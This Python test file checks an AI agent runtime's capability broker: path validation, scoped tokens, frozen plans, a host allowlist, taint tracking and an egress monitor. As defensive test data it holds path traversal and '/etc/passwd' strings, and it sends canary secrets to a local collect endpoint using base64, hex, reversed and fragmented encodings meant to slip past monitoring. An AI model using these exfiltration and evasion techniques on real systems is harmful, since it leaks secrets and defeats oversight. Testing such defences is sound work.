import base64
import os
import subprocess
from pathlib import Path

import pytest

from agent_runtime.broker import AuditLog, CapabilityBroker, PathViolation, resolve_vault_path
from agent_runtime.contracts import (
    CONFIGS, ActionType, AuditKind, EnclaveId, Label, Plan, PlanStep, ToolCall, ToolName,
)
from agent_runtime.tools import local_tools

COLLECT = "http://127.0.0.1:8000/collect?d="


class FakeClock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


def make_broker(vault: Path, tmp_path: Path, config: str = "C", clock=None) -> CapabilityBroker:
    broker = CapabilityBroker("sess1", vault, AuditLog(tmp_path / "audit.jsonl"), CONFIGS[config],
                              clock=clock or FakeClock())
    broker.register_tool(ToolName.READ_FILE, local_tools.read_file)
    broker.register_tool(ToolName.READ_INBOX, local_tools.read_inbox)
    broker.register_tool(ToolName.WRITE_DIFF, local_tools.write_diff)
    broker.register_tool(ToolName.FETCH_URL, lambda url: f"fetched {url}")
    broker.register_tool(ToolName.WEB_SEARCH, lambda query: f"results {query}")
    return broker


def step(action: ActionType, target: str, step_id: str = "s1") -> PlanStep:
    return PlanStep(step_id=step_id, action=action, target=target)


def call(broker, enclave, tool, args, token=None):
    tool_name = tool.value if isinstance(tool, ToolName) else tool
    return broker.execute(ToolCall(call_id=broker.new_call_id(), session_id=broker.session_id,
                                   enclave=enclave, tool=tool_name, args=args, token=token))


# -- camino feliz ------------------------------------------------------------ #

def test_worker_reads_l2_and_writes_l1(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    token = broker.mint_for_step(step(ActionType.READ_VAULT, "restricted_vault/contract_acme.md"))
    result = call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE,
                  {"path": "restricted_vault/contract_acme.md"}, token)
    assert result.decision.allowed and result.label is Label.L2 and "Acme Corp" in result.output
    assert broker.context_label(EnclaveId.VAULT_WORKER) is Label.L2
    token = broker.mint_for_step(step(ActionType.WRITE_REPORT, "internal_workspace/reporte_auditoria.md", "s2"))
    result = call(broker, EnclaveId.VAULT_WORKER, ToolName.WRITE_DIFF,
                  {"path": "internal_workspace/reporte_auditoria.md", "old": "", "new": "- ok"}, token)
    assert result.decision.allowed
    assert "- ok" in (vault / "internal_workspace/reporte_auditoria.md").read_text(encoding="utf-8")


def test_scope_is_case_and_separator_insensitive(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    token = broker.mint_for_step(step(ActionType.READ_VAULT, "restricted_vault/contract_acme.md"))
    result = call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE,
                  {"path": "Restricted_Vault\\CONTRACT_ACME.md"}, token)
    assert result.decision.allowed


# -- rutas ------------------------------------------------------------------- #

@pytest.mark.parametrize("raw,rule", [
    ("../../outside.txt", "path_escape"),
    ("untrusted_inbox/../../../Windows/win.ini", "path_escape"),
    ("C:/Windows/win.ini", "path_absolute"),
    ("/etc/passwd", "path_absolute"),
    ("\\\\server\\share\\x", "path_unc"),
    ("\\\\?\\C:\\Windows\\win.ini", "path_unc"),
    ("//./pipe/x", "path_unc"),
    ("restricted_vault/.env::$DATA", "path_invalid"),
    ("restricted_vault./.env", "path_invalid"),
    ("internal_workspace/nul", "path_invalid"),
    ("app.py", "path_outside_levels"),
    ("", "path_invalid"),
])
def test_path_resolution_rejects(vault, raw, rule):
    with pytest.raises(PathViolation) as excinfo:
        resolve_vault_path(raw, vault)
    assert excinfo.value.rule == rule


def test_traversal_from_inbox_into_l2_is_denied(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    traversal = "untrusted_inbox/../restricted_vault/.env"
    token = broker.mint_for_step(step(ActionType.READ_INBOX, traversal))
    result = call(broker, EnclaveId.CUSTOMS, ToolName.READ_INBOX, {"path": traversal}, token)
    assert not result.decision.allowed and result.decision.rule == "path_level_not_allowed"
    assert result.output is None


def _make_link(link: Path, target: Path) -> bool:
    try:
        os.symlink(target, link, target_is_directory=target.is_dir())
        return True
    except (OSError, NotImplementedError):
        pass
    if os.name == "nt" and target.is_dir():
        done = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(target)], capture_output=True)
        return done.returncode == 0
    return False


def test_symlink_or_junction_is_denied(vault, tmp_path):
    link = vault / "untrusted_inbox" / "shortcut"
    if not _make_link(link, vault / "restricted_vault"):
        pytest.skip("cannot create symlink or junction on this machine")
    with pytest.raises(PathViolation) as excinfo:
        resolve_vault_path("untrusted_inbox/shortcut/.env", vault)
    assert excinfo.value.rule == "path_symlink"
    broker = make_broker(vault, tmp_path)
    token = broker.mint_for_step(step(ActionType.READ_INBOX, "untrusted_inbox/shortcut/.env"))
    result = call(broker, EnclaveId.CUSTOMS, ToolName.READ_INBOX, {"path": "untrusted_inbox/shortcut/.env"}, token)
    assert result.decision.rule == "path_symlink"


def test_worker_cannot_write_l2_or_l0(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    for target in ("restricted_vault/.env", "untrusted_inbox/x.md"):
        token = broker.mint_for_step(step(ActionType.WRITE_REPORT, target))
        result = call(broker, EnclaveId.VAULT_WORKER, ToolName.WRITE_DIFF,
                      {"path": target, "old": "", "new": "x"}, token)
        assert result.decision.rule == "path_level_not_allowed"


# -- separación de privilegios ---------------------------------------------- #

def test_vault_worker_has_no_network_tools(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    token = broker.mint_for_step(step(ActionType.FETCH_URL, COLLECT + "x"))  # token legítimo de la Aduana
    for tool, args in ((ToolName.FETCH_URL, {"url": COLLECT + "x"}), (ToolName.WEB_SEARCH, {"query": "x"})):
        result = call(broker, EnclaveId.VAULT_WORKER, tool, args, token)
        assert result.decision.rule == "tool_not_in_registry"


def test_customs_has_no_vault_tools(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    token = broker.mint_for_step(step(ActionType.READ_VAULT, "restricted_vault/.env"))
    result = call(broker, EnclaveId.CUSTOMS, ToolName.READ_FILE, {"path": "restricted_vault/.env"}, token)
    assert result.decision.rule == "tool_not_in_registry"
    result = call(broker, EnclaveId.CUSTOMS, ToolName.WRITE_DIFF,
                  {"path": "internal_workspace/app.py", "old": "", "new": "x"}, token)
    assert result.decision.rule == "tool_not_in_registry"
    # read_inbox existe para la Aduana pero no alcanza L1/L2
    token = broker.mint_for_step(step(ActionType.READ_INBOX, "restricted_vault/.env"))
    result = call(broker, EnclaveId.CUSTOMS, ToolName.READ_INBOX, {"path": "restricted_vault/.env"}, token)
    assert result.decision.rule == "path_level_not_allowed"


def test_orchestrator_has_no_tools_and_unknown_tool(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    assert call(broker, EnclaveId.ORCHESTRATOR, ToolName.READ_FILE, {"path": "x"}).decision.rule == "tool_not_in_registry"
    assert call(broker, EnclaveId.CUSTOMS, "shell_exec", {"cmd": "x"}).decision.rule == "tool_unknown"


# -- tokens ------------------------------------------------------------------ #

def test_token_missing_expired_reused_forged(vault, tmp_path):
    clock = FakeClock()
    broker = make_broker(vault, tmp_path, clock=clock)
    path = "internal_workspace/app.py"
    args = {"path": path}
    assert call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, args).decision.rule == "token_missing"

    token = broker.mint_for_step(step(ActionType.READ_VAULT, path))
    assert call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, args, token).decision.allowed
    assert call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, args, token).decision.rule == "token_reused"

    token = broker.mint_for_step(step(ActionType.READ_VAULT, path), ttl=10)
    clock.now += 11
    assert call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, args, token).decision.rule == "token_expired"

    token = broker.mint_for_step(step(ActionType.READ_VAULT, path))
    widened = token.model_copy(update={"scope": "*"})
    assert call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, args, widened).decision.rule == "token_bad_signature"
    extended = token.model_copy(update={"expires_at": token.expires_at + 9999})
    assert call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, args, extended).decision.rule == "token_bad_signature"


def test_token_from_other_session_is_rejected(vault, tmp_path):
    broker_a = make_broker(vault, tmp_path)
    broker_b = make_broker(vault, tmp_path)
    token = broker_a.mint_for_step(step(ActionType.READ_VAULT, "internal_workspace/app.py"))
    result = call(broker_b, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, {"path": "internal_workspace/app.py"}, token)
    assert result.decision.rule == "token_bad_signature"


def test_token_scope_binds_path_and_tool(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    token = broker.mint_for_step(step(ActionType.WRITE_REPORT, "internal_workspace/reporte_auditoria.md"))
    result = call(broker, EnclaveId.VAULT_WORKER, ToolName.WRITE_DIFF,
                  {"path": "internal_workspace/app.py", "old": "", "new": "x = 1"}, token)
    assert result.decision.rule == "token_scope_mismatch"
    assert "x = 1" not in (vault / "internal_workspace/app.py").read_text(encoding="utf-8")
    token = broker.mint_for_step(step(ActionType.READ_VAULT, "internal_workspace/app.py"))
    result = call(broker, EnclaveId.VAULT_WORKER, ToolName.WRITE_DIFF,
                  {"path": "internal_workspace/app.py", "old": "", "new": "x"}, token)
    assert result.decision.rule == "token_scope_mismatch"


def test_frozen_plan_blocks_new_steps(vault, tmp_path):
    broker = make_broker(vault, tmp_path, "D")
    planned = step(ActionType.FETCH_URL, "http://127.0.0.1:8000/invoice/1042")
    broker.register_plan(Plan(session_id="sess1", user_prompt="p", steps=(planned,), frozen=True))
    assert broker.mint_for_step(planned) is not None
    assert broker.mint_for_step(step(ActionType.READ_VAULT, "restricted_vault/.env", "s2")) is None
    assert broker.mint_for_step(planned.model_copy(update={"target": COLLECT + "x"})) is None
    with pytest.raises(PermissionError):
        broker.register_plan(Plan(session_id="sess1", user_prompt="p", steps=(), frozen=False))
    assert any(e.rule == "step_not_in_plan" for e in broker.audit.events)


# -- red, taint y egreso ----------------------------------------------------- #

def test_network_host_allowlist_and_scope(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    assert broker.mint_for_step(step(ActionType.FETCH_URL, "http://example.com/")) is None
    token = broker.mint_for_step(step(ActionType.FETCH_URL, "http://127.0.0.1:8000/docs-benign"))
    for url in ("http://127.0.0.1:8000@example.com/docs-benign", "https://127.0.0.1:8000/docs-benign",
                "http://localhost:8000/docs-benign", "http://127.0.0.1:9000/docs-benign"):
        assert call(broker, EnclaveId.CUSTOMS, ToolName.FETCH_URL, {"url": url}, token).decision.rule == "host_not_allowed"
    result = call(broker, EnclaveId.CUSTOMS, ToolName.FETCH_URL, {"url": COLLECT + "x"}, token)
    assert result.decision.rule == "token_scope_mismatch"
    assert call(broker, EnclaveId.CUSTOMS, ToolName.FETCH_URL,
                {"url": "http://127.0.0.1:8000/docs-benign"}, token).decision.allowed


def test_subresource_token_only_for_static(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    page = step(ActionType.FETCH_URL, "http://127.0.0.1:8000/docs-image-injection")
    assert broker.mint_subresource(page, "http://127.0.0.1:8000/static/trap_lowcontrast.png") is not None
    assert broker.mint_subresource(page, "http://127.0.0.1:8000/static/a.png?d=secret") is None
    assert broker.mint_subresource(page, COLLECT + "x") is None


def test_taint_blocks_network_after_l2_exposure(vault, tmp_path):
    broker = make_broker(vault, tmp_path, "C")
    broker.note_exposure(EnclaveId.ORCHESTRATOR, Label.L2, "worker free text")
    broker.transfer(EnclaveId.ORCHESTRATOR, EnclaveId.CUSTOMS, "dispatch")
    for action, tool, args in (
        (ActionType.FETCH_URL, ToolName.FETCH_URL, {"url": "http://127.0.0.1:8000/docs-benign"}),
        (ActionType.WEB_SEARCH, ToolName.WEB_SEARCH, {"query": "anything"}),
    ):
        token = broker.mint_for_step(step(action, next(iter(args.values()))))
        assert call(broker, EnclaveId.CUSTOMS, tool, args, token).decision.rule == "taint_l2_to_network"


def test_taint_disabled_in_config_b(vault, tmp_path):
    broker = make_broker(vault, tmp_path, "B")
    broker.note_exposure(EnclaveId.CUSTOMS, Label.L2, "test")
    url = COLLECT + broker.canaries[0]
    token = broker.mint_for_step(step(ActionType.FETCH_URL, url))
    assert call(broker, EnclaveId.CUSTOMS, ToolName.FETCH_URL, {"url": url}, token).decision.allowed


def test_written_file_inherits_l2_label(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    broker.note_exposure(EnclaveId.VAULT_WORKER, Label.L2, "test")
    report = "internal_workspace/reporte_auditoria.md"
    token = broker.mint_for_step(step(ActionType.WRITE_REPORT, report))
    call(broker, EnclaveId.VAULT_WORKER, ToolName.WRITE_DIFF, {"path": report, "old": "", "new": "x"}, token)
    token = broker.mint_for_step(step(ActionType.READ_VAULT, report, "s2"))
    assert call(broker, EnclaveId.VAULT_WORKER, ToolName.READ_FILE, {"path": report}, token).label is Label.L2


def _egress_only(vault, tmp_path) -> CapabilityBroker:
    config = CONFIGS["C"].model_copy(update={"taint": False})
    broker = CapabilityBroker("sess1", vault, AuditLog(tmp_path / "audit.jsonl"), config)
    broker.register_tool(ToolName.FETCH_URL, lambda url: "ok")
    broker.register_tool(ToolName.WEB_SEARCH, lambda query: "ok")
    return broker


@pytest.mark.parametrize("encode", [
    lambda c: c,
    lambda c: base64.b64encode(c.encode()).decode(),
    lambda c: base64.urlsafe_b64encode(("key=" + c).encode()).decode().rstrip("="),
    lambda c: "".join(f"%{b:02X}" for b in c.encode()),
    lambda c: c.encode().hex(),
    lambda c: c[::-1],
], ids=["plain", "base64", "base64url", "urlencoded", "hex", "reversed"])
def test_egress_monitor_blocks_encoded_canary(vault, tmp_path, encode):
    broker = _egress_only(vault, tmp_path)
    assert broker.canaries, "vault must contain canaries"
    canary = broker.canaries[0]
    url = COLLECT + encode(canary)
    token = broker.mint_for_step(step(ActionType.FETCH_URL, url))
    result = call(broker, EnclaveId.CUSTOMS, ToolName.FETCH_URL, {"url": url}, token)
    assert result.decision.rule == "egress_canary_detected"
    query = "status " + encode(canary)
    token = broker.mint_for_step(step(ActionType.WEB_SEARCH, query, "s2"))
    assert call(broker, EnclaveId.CUSTOMS, ToolName.WEB_SEARCH, {"query": query}, token).decision.rule == "egress_canary_detected"
    assert canary not in (tmp_path / "audit.jsonl").read_text(encoding="utf-8")


def test_egress_monitor_blocks_fragmented_canary(vault, tmp_path):
    broker = _egress_only(vault, tmp_path)
    canary = broker.canaries[0]
    chunks = [canary[i:i + 6] for i in range(0, len(canary), 6)]
    rules = []
    for index, chunk in enumerate(chunks):
        url = f"{COLLECT}{chunk}&part={index}"
        token = broker.mint_for_step(step(ActionType.FETCH_URL, url, f"s{index}"))
        rules.append(call(broker, EnclaveId.CUSTOMS, ToolName.FETCH_URL, {"url": url}, token).decision.rule)
    assert rules[0] == "allow"
    assert "egress_canary_detected" in rules
    assert any(e.kind is AuditKind.EGRESS_ALERT for e in broker.audit.events)


def test_benign_network_call_is_not_flagged(vault, tmp_path):
    broker = _egress_only(vault, tmp_path)
    url = "http://127.0.0.1:8000/invoice/1042"
    token = broker.mint_for_step(step(ActionType.FETCH_URL, url))
    assert call(broker, EnclaveId.CUSTOMS, ToolName.FETCH_URL, {"url": url}, token).decision.allowed


# -- auditoría --------------------------------------------------------------- #

def test_audit_log_records_calls_and_decisions(vault, tmp_path):
    broker = make_broker(vault, tmp_path)
    call(broker, EnclaveId.CUSTOMS, ToolName.READ_FILE, {"path": "restricted_vault/.env"})
    lines = (tmp_path / "audit.jsonl").read_text(encoding="utf-8").splitlines()
    kinds = [line.split('"kind":"')[1].split('"')[0] for line in lines]
    assert kinds == ["session_start", "tool_call", "broker_decision"]
    assert '"rule":"tool_not_in_registry"' in lines[-1] and '"allowed":false' in lines[-1]
